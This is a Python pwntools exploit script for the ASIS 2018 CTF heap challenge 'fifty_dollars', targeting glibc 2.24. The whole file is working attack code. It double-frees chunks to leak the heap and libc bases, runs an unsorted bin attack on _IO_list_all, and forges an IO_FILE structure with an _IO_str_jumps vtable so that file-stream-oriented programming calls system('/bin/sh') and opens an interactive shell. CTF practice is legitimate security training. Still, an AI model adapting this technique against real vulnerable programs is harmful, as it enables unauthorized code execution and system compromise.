# File: exp.py
# Author: raycp
# Date: 2019-05-16
# Description: exp for fifty_dollar, fsop fp->_chain two times

from pwn_debug.pwn_debug import *
from pwn_debug.IO_FILE_plus import *
pdbg=pwn_debug("ASIS2018-fifty_dollars")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local()
pdbg.debug("2.24")
pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print type(pdbg.membp)
#print pdbg.hh
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc
#a=IO_FILE_plus()
#print a
#a.show()
#print a._IO_read_base

def alloc(idx,data):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("dex:")
    p.sendline(str(idx))
    p.recvuntil("Content:")
    p.send(data)

def delete(idx):
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil("dex:")
    p.sendline(str(idx))


def show(idx):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("dex:")
    p.sendline(str(idx))


def arbitrary_write(addr,data):
    delete(3)
    delete(4)
    delete(3)
    pad=p64(0)+p64(0x61)
    alloc(3,p64(addr-0x10))
    alloc(4,pad*5)
    alloc(3,pad*5)
    alloc(0,data)


def pwn():
    
    #pdbg.bp([0xbae])
    data=(p64(0)+p64(0x61))*5
    for i in range(0,10):
        alloc(i,data)
    #alloc(1,"b")
    
    # step 1 leak heap base
    delete(1)
    delete(0)
    show(0)
    heap_base=u64(p.recvuntil("Done!")[:-5].ljust(8,'\x00'))-0x60
    log.info("leaking heap base: %s"%hex(heap_base))
    data=p64(heap_base+0x50)

    delete(1)
    #pdbg.bp(0xb53)
    alloc(1,data)
    alloc(0,data)
    alloc(1,data)
    ## step 2 build a fake unsorted bin with size of 0xb1 and leak libc address
    fake=p64(0)+p64(0xb1)
    alloc(8,fake)
    #pdbg.bp(0xada)
    delete(1)
    show(1)
    libc_base=u64(p.recvuntil("Done!")[:-5].ljust(8,'\x00'))-libc.symbols['main_arena']-88
    io_list_all=libc_base+libc.symbols['_IO_list_all']
    binsh_addr=libc_base+next(libc.search("/bin/sh"))
    io_str_jumps=libc_base+libc.symbols['_IO_str_jumps']
    system_addr=libc_base+libc.symbols['system']
    log.info("leaking libc base: %s"%hex(libc_base))
    
    
    
    arbitrary_write(heap_base+0x240,p64(0)+p64(0xa1))
    delete(6)

    #pdbg.bp([0xada,0xb06])

    ## step 3 right now there are two unsorted bin in main_arena, so we need to malloc 0xa0 chunk and put 0xb0 chunk to smallbin array
    ### malloc 0x60 from 0xa0 first
    alloc(0,'a')
    ### revise the left chunk size from 0x40 to 0x60 and malloc it out.
    arbitrary_write(heap_base+0x2a0,p64(0)+p64(0x61))


    #pdbg.bp([0xada,0xb06])
    ## step 4 prepare to unsoeted bin attack
    delete(7)
    alloc(7,p64(0)+p64(io_list_all-0x10))
    alloc(7,'0')

    fake_file=IO_FILE_plus()
    #fake_file._flags=0x1
    fake_file._IO_read_ptr=0xb1
    #fake_file._IO_read_base=io_list_all-0x10
    fake_file._IO_buf_base=binsh_addr
    fake_file._IO_write_ptr=1
    fake_file.vtable=io_str_jumps-8

    fake_file.show()
    fake_file.str_finish_check()
    file_data=str(fake_file)+p64(system_addr)*2

    ## step 5 write fake file
    arbitrary_write(heap_base+0x60,file_data[:0x50])
    #pdbg.bp([0xada,0xb06])
    arbitrary_write(heap_base+0x60+len(str(fake_file))-0x10,file_data[-0x20:])
    #pdbg.bp(0xb06)

    ## step 6 trigger FSOP to get shell
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("Index:")
    p.sendline("1")
    p.interactive() #get the shell

if __name__ == '__main__':
   pwn()


